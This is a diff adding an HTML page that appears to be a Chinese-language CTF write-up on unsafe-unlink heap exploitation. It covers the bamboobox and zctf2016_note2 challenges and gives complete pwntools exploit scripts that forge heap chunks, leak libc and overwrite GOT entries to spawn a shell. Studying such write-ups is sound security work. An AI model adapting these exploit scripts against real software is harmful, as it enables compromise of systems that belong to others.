+    edit(0, len(payload), payload)
+
+    #free global[1] to leak puts addr
+    free(1)
+    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
+    puts_addr = u64(puts_addr)
+    log.success('puts addr: ' + hex(puts_addr))
+    libc_base = puts_addr - libc.symbols['puts']
+    binsh_addr = libc_base + next(libc.search('/bin/sh'))
+    system_addr = libc_base + libc.symbols['system']
+    log.success('libc base: ' + hex(libc_base))
+    log.success('/bin/sh addr: ' + hex(binsh_addr))
+    log.success('system addr: ' + hex(system_addr))
+    # modify atoi@got to system addr
+    payload = p64(system_addr)
+    edit(2, len(payload), payload)
+    p.send(p64(binsh_addr))
+    p.interactive()
+</code></pre>
+<h1>e.g. hitcon_trainning bamboobox</h1>
+<h2>1.checksec</h2>
+<pre><code class="language-asp">    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<h2>2.IDA</h2>
+<pre><code class="language-python">def add(length,name):
+	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
+	p.sendlineafter(&quot;:&quot;,str(length))
+	p.sendlineafter(&quot;:&quot;,name)
+</code></pre>
+<pre><code class="language-python">def edit(idx,length,name):
+	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
+	p.sendlineafter(&quot;:&quot;,str(idx))
+	p.sendlineafter(&quot;:&quot;,str(length))
+	p.sendlineafter(&quot;:&quot;,name)
+</code></pre>
+<pre><code class="language-python">def free(idx):
+	p.sendlineafter(&quot;:&quot;,&quot;4&quot;)
+	p.sendlineafter(&quot;:&quot;,str(idx))
+</code></pre>
+<pre><code class="language-python">def show():
+	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
+</code></pre>
+<p><strong>back_door</strong></p>
+<pre><code class="language-c">void __noreturn magic()
+{
+  int fd; // ST0C_4
+  char buf; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v2; // [rsp+78h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  fd = open(&quot;/home/bamboobox/flag&quot;, 0);
+  read(fd, &amp;buf, 0x64uLL);
+  close(fd);
+  printf(&quot;%s&quot;, &amp;buf);
+  exit(0);
+}
+</code></pre>
+<p><strong>change_item</strong></p>
+<pre><code class="language-c">     printf(&quot;Please enter the length of item name:&quot;, &amp;buf);
+      read(0, &amp;nptr, 8uLL);
+      v0 = atoi(&amp;nptr);
+      printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr);
+      *(_BYTE *)(qword_6020C8[2 * v2] + (signed int)read(0, (void *)qword_6020C8[2 * v2], v0)) = 0;
+    }
+</code></pre>
+<blockquote>
+<p>堆溢出</p>
+</blockquote>
+<h2>3.EXP</h2>
+<blockquote>
+<p>原版EXP方便理解所以直接拿来用了</p>
+</blockquote>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+elf = ELF(&quot;./bamboobox&quot;)
+r = process(&quot;./bamboobox&quot;)
+
+def additem(length,name):
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(&quot;2&quot;)
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(str(length))
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(name)
+
+def modify(idx,length,name):
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(&quot;3&quot;)
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(str(idx))
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(str(length))
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(name)
+
+def remove(idx):
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(&quot;4&quot;)
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(str(idx))
+
+def show():
+    r.recvuntil(&quot;:&quot;)
+    r.sendline(&quot;1&quot;)
+
+additem(0x40,&quot;a&quot;*8)
+additem(0x80,&quot;b&quot;*8)
+additem(0x40,&quot;c&quot;*8)
+
+ptr = 0x6020c8 #global pointer
+fake_chunk = p64(0) #prev_size
+fake_chunk += p64(0x41) #size
+fake_chunk += p64(ptr-0x18) #fd
+fake_chunk += p64(ptr-0x10) #bk
+fake_chunk += &quot;c&quot;*0x20
+fake_chunk += p64(0x40) #fd_nextsize
+fake_chunk += p64(0x90) #bk_nextsize
+
+modify(0,0x80,fake_chunk) #unlink
+remove(1)
+
+payload = p64(0)*2
+payload += p64(0x40) + p64(elf.got[&quot;atoi&quot;])
+modify(0,0x80,payload)
+show()		#libc base leak
+r.recvuntil(&quot;0 : &quot;)
+atoi = u64(r.recvuntil(&quot;:&quot;)[:6].ljust(8,&quot;\x00&quot;))
+libc = atoi - 0x36e80
+print &quot;libc:&quot;,hex(libc)
+system = libc + 0x45390
+
+modify(0,0x8,p64(system))
+r.recvuntil(&quot;:&quot;)
+r.sendline(&quot;sh&quot;)
+r.interactive()
+</code></pre>
+<blockquote>
+<p>这里可以看见我们伪造的堆结构:</p>
+<pre><code class="language-python">ptr = 0x6020c8
+fake_chunk = p64(0) #prev_size
+fake_chunk += p64(0x41) #size
+fake_chunk += p64(ptr-0x18) #fd
+fake_chunk += p64(ptr-0x10) #bk
+fake_chunk += &quot;c&quot;*0x20
+fake_chunk += p64(0x40) #fd_nextsize
+fake_chunk += p64(0x90) #bk_nextsize
+</code></pre>
+</blockquote>
+<h1>e.g. zctf2016_note2</h1>
+<h2>1.checksec</h2>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<h2>2.IDA</h2>
+<p><strong>bss段</strong></p>
+<pre><code class="language-assembly">.bss:0000000000602120 HeapAddrList    dq ?                    ; DATA XREF: add_note+94↑w
+.bss:0000000000602120                                         ; delete_note+2F↑r ...
+.bss:0000000000602128                 align 20h
+.bss:0000000000602140 ; __int64 HeapList[]
+.bss:0000000000602140 HeapList        dq ?                    ; DATA XREF: add_note+A7↑w
+.bss:0000000000602140                                         ; delete_note+67↑w ...
+.bss:0000000000602148                 align 20h
+.bss:0000000000602160 heap_number     dd ?                    ; DATA XREF: add_note+8↑r
+.bss:0000000000602160                                         ; add_note+88↑r ...
+.bss:0000000000602164                 align 20h
+.bss:0000000000602180 unk_602180      db    ? ;               ; DATA XREF: main+9A↑o
+</code></pre>
+<blockquote>
+<p>使用了一个地址来存放所有申请到的堆的地址</p>
+<p>使用unsafe unlink来获得free@got的地址，通过show函数泄露出来，</p>
+<p>最后使用edit函数将free@got修改为onegadget</p>
+</blockquote>
+<h2>3.EXP</h2>
+<pre><code class="language-python">#coding=utf-8
+from pwn import *
+context.log_level =&quot;debug&quot;
+#DEBUG = 0
+sh = process(&quot;./note2&quot;)
+#sh = remote(&quot;node3.buuoj.cn&quot;,&quot;29856&quot;)
+elf = ELF(&quot;./note2&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+def new_note(size, content):
+    sh.recvuntil(&quot;&gt;&gt;&quot;)
+    sh.sendline(&quot;1&quot;)
+    sh.recvuntil(&quot;)&quot;)
+    sh.sendline(str(size))
+    sh.recvuntil(&quot;:&quot;)
+    sh.sendline(content)
+
+def show_note(index):
+    sh.recvuntil(&quot;&gt;&gt;&quot;)
+    sh.sendline(&quot;2&quot;)
+    sh.recvuntil(&quot;:&quot;)
+    sh.sendline(str(index))
+
+def edit_note(index, choice, content):
+    sh.recvuntil(&quot;&gt;&gt;&quot;)
+    sh.sendline(&quot;3&quot;)
+    sh.recvuntil(&quot;:&quot;)
+    sh.sendline(str(index))
+    sh.recvuntil(&quot;]&quot;)
+    sh.sendline(str(choice))
+    sh.recvuntil(&quot;:&quot;)
+    sh.sendline(content)
+
+def delete_note(index):
+    sh.recvuntil(&quot;&gt;&gt;&quot;)
+    sh.sendline(&quot;4&quot;)
+    sh.recvuntil(&quot;:&quot;)
+    sh.sendline(str(index))
+
+sh.recvuntil(&quot;:&quot;)
+sh.sendline(&quot;zzz&quot;)
+sh.recvuntil(&quot;:&quot;)
+sh.sendline(&quot;ddd&quot;)
+
+ptr_0 = 0x602120
+fake_fd = ptr_0 - 0x18
+fake_bk = ptr_0 - 0x10
+note0_content = p64(0) + p64(0xa1) + p64(fake_fd) + p64(fake_bk)
+
+new_note(0x80, note0_content) #note0
+
+new_note(0x0, &quot;aa&quot;) #note1
+new_note(0x80, &quot;bb&quot;) #note2
+
+delete_note(1)
+note1_content = &quot;\x00&quot; * 16 + p64(0xa0) + p64(0x90)
+new_note(0x0, note1_content)#note3
+delete_note(2) #unlink
+
+free_got = elf.got[&quot;free&quot;]
+payload = 0x18 * &quot;a&quot; + p64(free_got)
+edit_note(0, 1, payload)
+
+show_note(0)
+sh.recvuntil(&quot;is &quot;)
+
+free_addr = u64(sh.recv(6).ljust(8, &quot;\x00&quot;))
+libc_addr = free_addr - libc.symbols[&quot;free&quot;]
+success(&quot;free address: &quot; + hex(free_addr))
+success(&quot;libc address: &quot; + hex(libc_addr))
+
+#get shell
+system_addr = libc_addr + libc.symbols[&quot;system&quot;]
+one_gadget = libc_addr + 0xf02a4
+edit_note(0, 1, p64(one_gadget)) #overwrite free got -&gt; system address
+
+sh.interactive()
+</code></pre>
+
+</div>
+</div></body></html>
